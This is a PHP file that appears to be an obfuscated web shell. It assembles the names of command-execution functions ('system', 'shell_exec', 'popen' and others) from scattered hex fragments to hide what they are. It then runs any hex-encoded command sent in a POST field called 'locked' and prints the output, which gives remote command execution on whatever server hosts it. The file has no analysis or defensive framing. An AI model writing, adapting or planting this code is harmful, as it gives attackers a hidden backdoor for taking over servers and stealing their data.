<?php

$param1 = '973';
$param2 = '746';
$param3 = '56d';
$param4 = '736';
$param5 = '6c6';
$param6 = 'c5f';
$param7 = '865';
$param8 = '737';
$param9 = '706';
$param10 = '656';
$param11 = '472';
$param12 = '16d';
$param13 = '5f6';
$param14 = '765';
$param15 = '745';
$param16 = 'e74';
$param17 = '365';
$param18 = '564';
$content1 = pack("H*", '737'.$param1.$param2.$param3);
$content2 = pack("H*", $param4.'865'.$param5.$param6.'657'.$param7);
$content3 = pack("H*", '657'.$param7);
$content4 = pack("H*", '706'.'173'.$param8.'468'.'727');
$content5 = pack("H*", $param9.'f70'.$param10);
$content6 = pack("H*", '737'.$param11.'656'.$param12.$param13.$param14.$param15.'f63'.'6f6'.$param16.'656'.'e74');
$content7 = pack("H*", '706'.'36c'.'6f7'.$param17);
$locked = pack("H*", $param5.'f63'.'6b6'.$param18);
if (isset($_POST[$locked])) {
    $locked = pack("H*", $_POST[$locked]);
    if (function_exists($content1)) {
        $content1($locked);
    } elseif (function_exists($content2)) {
        print $content2($locked);
    } elseif (function_exists($content3)) {
        $content3($locked, $slt_fld);
        print join("\n", $slt_fld);
    } elseif (function_exists($content4)) {
        $content4($locked);
    } elseif (function_exists($content5) && function_exists($content6) && function_exists($content7)) {
        $const_arg = $content5($locked, 'r');
        if ($const_arg) {
            $argument_slot = $content6($const_arg);
            $content7($const_arg);
            print $argument_slot;
        }
    }
    exit;
}
